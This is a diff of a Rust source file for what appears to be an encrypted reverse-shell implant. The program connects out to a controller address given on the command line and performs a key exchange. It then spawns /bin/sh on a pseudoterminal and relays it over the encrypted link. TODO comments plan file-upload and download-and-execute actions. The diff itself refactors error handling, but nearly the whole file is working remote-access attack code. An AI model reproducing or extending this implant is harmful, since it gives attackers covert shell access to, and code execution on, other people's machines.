@@ -1,7 +1,5 @@
 #![cfg_attr(not(test), no_main)]
-#![feature(trait_alias)]
-#![feature(int_roundings)]
-#![feature(int_log)]
+#![feature(trait_alias, int_log, int_roundings)]
 
 extern crate libc;
 mod auxv;
@@ -9,29 +7,26 @@ mod kex;
 mod relay;
 pub mod util;
 
-#[allow(unused_imports)]
-use aes_gcm::{Aes256Gcm, Key, Nonce};
-#[allow(unused_imports)]
-use anyhow::{anyhow, Result};
-use auxv::getauxval;
 use base64ct::{Base64, Encoding};
-use kex::{play_auth_challenge_remote, play_dh_kex_remote};
 use p256::PublicKey;
 use rand_chacha::ChaCha20Rng;
 use rand_core::SeedableRng;
-use relay::{relay, RelayNode};
 use std::ffi::{c_char, c_int, CStr};
 use std::io;
 use std::mem::MaybeUninit;
-use std::net::{Ipv4Addr, SocketAddr, TcpStream};
+use std::net::{SocketAddr, TcpStream};
 use std::os::unix::io::AsRawFd;
 use std::os::unix::prelude::RawFd;
 use std::ptr;
 use thiserror::Error;
-use util::debug;
+use util::{copy_from_slice, debug};
 
-const LOCAL_PORT: u16 = 2000;
+use auxv::getauxval;
+#[allow(unused_imports)]
+use kex::{play_auth_challenge_remote, play_dh_kex_remote};
+use relay::{relay, RelayNode};
 
+// This little wrapper simply dereferences a pointer
 fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
 	if 0 != rand_ptr as usize {
 		// Assuming everything worked out correctly, this dereference
@@ -46,18 +41,6 @@ fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
 	}
 }
 
-// The ecdh library expects the PEM in a certain format
-//  use this function to convert from straight b64 to
-//  the expected format.
-fn format_public_key(b64_sec1: &str) -> ([u8; 1024], usize) {
-	let mut rebuilt = [0u8; 1024];
-	let size = {
-		let s = Base64::decode(b64_sec1, &mut rebuilt).unwrap();
-		s.len()
-	};
-	(rebuilt, size)
-}
-
 // This struct implementation duplicates nix's pty struct
 // implementation. It's a very thin layer around a RawFd, but makes
 // certain that you can read to and write from it.
@@ -65,6 +48,7 @@ fn format_public_key(b64_sec1: &str) -> ([u8; 1024], usize) {
 pub struct PtyMaster(RawFd);
 
 impl io::Read for PtyMaster {
+	// A wrapper for libc::read
 	fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
 		let res = unsafe {
 			libc::read(
@@ -83,6 +67,7 @@ impl io::Read for PtyMaster {
 }
 
 impl io::Write for PtyMaster {
+	// A wrapper for libc::write
 	fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
 		let res = unsafe {
 			libc::write(
@@ -98,13 +83,14 @@ impl io::Write for PtyMaster {
 			Ok(res as usize)
 		}
 	}
-
+	// When not using the FILE object, fd writes are not buffered.
 	fn flush(&mut self) -> io::Result<()> {
 		Ok(())
 	}
 }
 
 impl AsRawFd for PtyMaster {
+	// This trait is used by the relay
 	fn as_raw_fd(&self) -> RawFd {
 		self.0
 	}
@@ -122,6 +108,8 @@ enum PTYNameError {
 	NumTooBig,
 	#[error("Unable to ioctl the PTY number.")]
 	TIOCGPTN,
+	#[error("Unable to copy data?")]
+	Copy,
 }
 
 // Special purpose snprintf for determining the PTY name
@@ -133,8 +121,11 @@ fn pty_snprintf(
 	let size = dst_arr.len();
 	// Write in the /dev/pts/ part
 	let mut written = size.min(fmt_str.len() - 2);
-	dst_arr[0..written]
-		.copy_from_slice(fmt_str[..written].as_bytes());
+	copy_from_slice(
+		&mut dst_arr[0..written],
+		fmt_str[..written].as_bytes(),
+	)
+	.or(Err(PTYNameError::Copy))?;
 	// Determine how many digits it's going to take
 	let digits = (i.ilog10() + 1) as usize;
 	// Determine how much of that we can print
@@ -163,17 +154,18 @@ fn pty_snprintf(
 }
 
 // This function is supposed to mimic the real ptsname_r function
-// without using any formatting functions. Most of the work is moving
-// bytes around without creating any allocations.
+// without using any formatting functions.
 fn no_printf_ptsname_r(
 	fd: c_int,
 	name_buf: &mut [u8],
 ) -> Result<(), PTYNameError> {
+	// Get the tty number
 	let ptsnum: c_int =
 		unsafe { MaybeUninit::zeroed().assume_init() };
 	if 0 != unsafe { libc::ioctl(fd, libc::TIOCGPTN, &ptsnum) } {
 		return Err(PTYNameError::TIOCGPTN);
 	}
+	// Figure out the /dev/pts/{ptsnum} path
 	let ascii_size = pty_snprintf(
 		name_buf,
 		ptsnum.try_into().or(Err(PTYNameError::Cast))?,
@@ -185,53 +177,87 @@ fn no_printf_ptsname_r(
 	}
 }
 
-#[cfg_attr(not(test), no_mangle)]
-pub fn main(
+// These errors exist to prevent panics in the remote main function
+#[derive(Error, Debug)]
+enum RemoteError {
+	#[error("Invalid argv entries.")]
+	Arguments,
+	#[error("Invalid IP")]
+	ArgumentsIP,
+	#[error("Invalid public key")]
+	ArgumentsKey,
+	#[error("Unable to connect")]
+	Connect,
+	#[error("Failed key exchange")]
+	KEX,
+	#[error("Auth challenge")]
+	#[allow(dead_code)]
+	Challenge,
+	#[error("Unable to fork")]
+	LibcFork,
+	#[error("Unable to open file")]
+	LibcOpen,
+	#[error("Unable to create a pty")]
+	PTY,
+	#[error("Unable to register SIGCHLD")]
+	SIGCHLD,
+	#[error("libc error")]
+	Libc,
+}
+fn main_wrapper(
 	argc: i32,
 	argv: *const *const c_char,
 	envp: *const *const u8,
-) -> i8 {
+) -> Result<i8, RemoteError> {
 	// Check that we have the args
 	if argc < 3 {
-		return 1;
+		return Err(RemoteError::Arguments);
 	}
 
 	// Parse argv
 	let argv_ptrs =
 		unsafe { std::slice::from_raw_parts(argv, argc as usize) };
-	let ip_str =
-		unsafe { CStr::from_ptr(argv_ptrs[1]).to_str().unwrap() };
-	let key_str =
-		unsafe { CStr::from_ptr(argv_ptrs[2]).to_str().unwrap() };
-	// Parse the IP
-	let ipaddr_l: Ipv4Addr =
-		ip_str.parse().expect("Failed to parse IP");
+	let ip_str = unsafe { CStr::from_ptr(argv_ptrs[1]) }
+		.to_str()
+		.or(Err(RemoteError::Arguments))?;
+	let key_str = unsafe { CStr::from_ptr(argv_ptrs[2]) }
+		.to_str()
+		.or(Err(RemoteError::Arguments))?;
+
+	// Parse the IP:port
+	let addr_l: SocketAddr =
+		ip_str.parse().or(Err(RemoteError::ArgumentsIP))?;
+
 	// Parse the public key which should just be the base64 component
 	//  on a single line
-	let (rebuilt, rebuilt_sz) = format_public_key(&key_str);
+	let mut rebuilt = [0u8; 1024];
+	let rebuilt_sz = {
+		let s = Base64::decode(&key_str, &mut rebuilt)
+			.or(Err(RemoteError::ArgumentsKey))?;
+		s.len()
+	};
 	let pub_l = PublicKey::from_sec1_bytes(&rebuilt[..rebuilt_sz])
-		.expect("Failed to parse public key");
-
+		.or(Err(RemoteError::ArgumentsKey))?;
 	debug!(
 		"Found local's key:\n{:?}\nAnd address: {:#}",
-		pub_l, ipaddr_l,
+		pub_l, addr_l,
 	);
 
-	// Seed the RNG
-	// Prefer the auxiliary vector's random data entry for seeding
+	// Collect a seed for the RNG. Prefer the auxiliary vector's
+	// random data entry for seeding
 	let rand_ptr =
 		getauxval(envp, libc::AT_RANDOM as usize) as *const u64;
 	let seed1 = get_rand_seed(rand_ptr);
 
 	// TODO: Register SIGALRM
 
-	// Open the socket to remote
-	let addr = SocketAddr::from((ipaddr_l, LOCAL_PORT));
-	let mut remote =
-		TcpStream::connect(addr).expect("Unable to connect.");
+	// Open the socket to local
+	let mut local =
+		TcpStream::connect(addr_l).or(Err(RemoteError::Connect))?;
+
 	// Get the shared AES key
-	let key = play_dh_kex_remote(&mut remote, &pub_l, seed1)
-		.expect("Failed KEX");
+	let key = play_dh_kex_remote(&mut local, &pub_l, seed1)
+		.or(Err(RemoteError::KEX))?;
 
 	// Create a new rng for the challenge and nonce values
 	let mut rng = if let Some(seed2) =
@@ -243,27 +269,36 @@ pub fn main(
 		ChaCha20Rng::from_entropy()
 	};
 
-	// Challenge the remote
-	play_auth_challenge_remote(&mut remote, &pub_l, &mut rng)
-		.expect("Failed challenge");
+	// Challenge the local
+	#[cfg(feature = "challenge")]
+	play_auth_challenge_remote(&mut local, &pub_l, &mut rng)
+		.or(Err(RemoteError::Challenge))?;
+
+	// TODO: get the requested action from local
+	//  this might be something like:
+	//  Action::Shell
+	//  Action::PutFile
+	//  Action::DownloadExecute
 
 	// TODO: unregister SIGALRM
 
 	// Get a master pseudoterminal file descriptor
 	let master = unsafe { libc::posix_openpt(libc::O_RDWR) };
 	if master < 0 {
-		panic!("Unable to posix_openpt");
+		return Err(RemoteError::PTY);
 	}
 	// Register a slave pseudoterminal to this master
 	if 0 > unsafe { libc::grantpt(master) } {
-		panic!("Unable to grantpt");
+		return Err(RemoteError::PTY);
 	}
 	// Unlock the previously registered slave, allowing us to open it
 	if 0 > unsafe { libc::unlockpt(master) } {
-		panic!("Unable to unlockpt");
+		return Err(RemoteError::PTY);
 	}
+
+	// Fork so we can do both the relay and the requested action
 	match unsafe { libc::fork() } {
-		-1 => panic!("Unable to fork"),
+		-1 => return Err(RemoteError::LibcFork),
 		0 => {
 			// Child:
 			//  - create a new session and set the controlling
@@ -276,7 +311,7 @@ pub fn main(
 			let mut slave_name: [u8; 64] =
 				unsafe { MaybeUninit::zeroed().assume_init() };
 			no_printf_ptsname_r(master, &mut slave_name)
-				.expect("Unable to generate pty name.");
+				.or(Err(RemoteError::PTY))?;
 			// Open it
 			let slave = unsafe {
 				libc::open(
@@ -284,13 +319,16 @@ pub fn main(
 					libc::O_RDWR,
 				)
 			};
+			if 0 > slave {
+				return Err(RemoteError::LibcOpen);
+			}
 			// Establish this pid as the process tree root
 			if 0 > unsafe { libc::setsid() } {
-				panic!("Unable to setsid");
+				return Err(RemoteError::Libc);
 			}
 			// Set the slave as the controlling terminal to this pid
 			if 0 > unsafe { libc::ioctl(slave, libc::TIOCSCTTY) } {
-				panic!("Unable to ioctl TIOCSTTY");
+				return Err(RemoteError::Libc);
 			}
 			//  - close fds (except the pty slave) get the max fd
 			//    value
@@ -307,10 +345,10 @@ pub fn main(
 			//  - dup2
 			for fd in 0i32..3 {
 				if 0 > unsafe { libc::dup2(slave, fd) } {
-					panic!("Unable to dup2");
+					return Err(RemoteError::Libc);
 				}
 			}
-			//  - setup /bin/sh command
+			// Execute the requested Action
 			let sh = b"/bin/sh\0";
 			let mut argv_ptr = [0 as *const c_char; 2];
 			argv_ptr[0] = sh.as_ptr() as *const c_char;
@@ -339,22 +377,22 @@ pub fn main(
 				}
 			};
 			// Register the action
-			if -1
-				== unsafe {
-					libc::sigaction(
-						libc::SIGCHLD,
-						&sigact,
-						ptr::null_mut(),
-					)
-				} {
-				panic!("Unable to register SIGCHLD");
+			if unsafe {
+				libc::sigaction(
+					libc::SIGCHLD,
+					&sigact,
+					ptr::null_mut(),
+				)
+			} == -1
+			{
+				return Err(RemoteError::SIGCHLD);
 			}
 			// Start up the relay
 			let mut node1 = RelayNode {
 				readable: PtyMaster(master),
 				writeable: PtyMaster(master),
 			};
-			match relay(&mut node1, &mut remote, &key, &mut rng) {
+			match relay(&mut node1, &mut local, &key, &mut rng) {
 				Ok(_) => {
 					debug!("Remote finished relay");
 					()
@@ -365,8 +403,17 @@ pub fn main(
 				}
 			}
 		}
-	};
-	return 0;
+	}
+	Ok(0)
+}
+
+#[cfg_attr(not(test), no_mangle)]
+pub fn main(
+	argc: i32,
+	argv: *const *const c_char,
+	envp: *const *const u8,
+) -> i8 {
+	main_wrapper(argc, argv, envp).unwrap_or(-1)
 }
 
 fn exit_on_sigchld(
